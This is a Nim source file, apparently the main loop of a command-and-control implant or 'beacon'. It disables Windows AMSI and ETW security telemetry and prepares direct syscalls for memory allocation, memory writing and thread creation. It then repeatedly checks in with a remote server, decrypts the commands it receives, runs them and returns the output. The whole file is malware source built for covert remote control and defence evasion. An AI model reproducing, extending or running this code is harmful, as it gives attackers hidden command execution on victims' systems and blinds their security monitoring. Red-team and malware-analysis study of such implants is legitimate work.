import os, json, strformat
import utils, comms, config, syscalls
import crypto
import std/random
import std/times

proc main() =
    PatchAMSI()
    echo "ASMI done!"
    PathETW()
    echo "ETW done!"

    let AGENT_ID = genID()

    makeNtAllocateVirtualMemory()
    makeNtWriteVirtualMemory()
    makeNtCreateThreadEx()
    makeNtCreateNamedPipeFile()
    makeNtCreateProcess()
  
    randomize()

 
    echo fmt"[+] Beacon started with ID {AGENT_ID}"

    while true:
        echo "[*] Sending checkin..."
        let response = sendCheckin(AGENT_ID) #response of the post request made to endpoint , contains (task_id,cmd)

        if response.len > 0:
            let rawtask = decryptJson(parseJson(response),AES_KEY)
            let output = execProcess(rawtask["command"].getStr())
            discard sendTaskResult(AGENT_ID,rawtask["task_id"].getStr(),rawtask["command"].getStr(),output)
        randomSleep(SLEEP_MIN, SLEEP_MAX)      
when isMainModule:
  main()
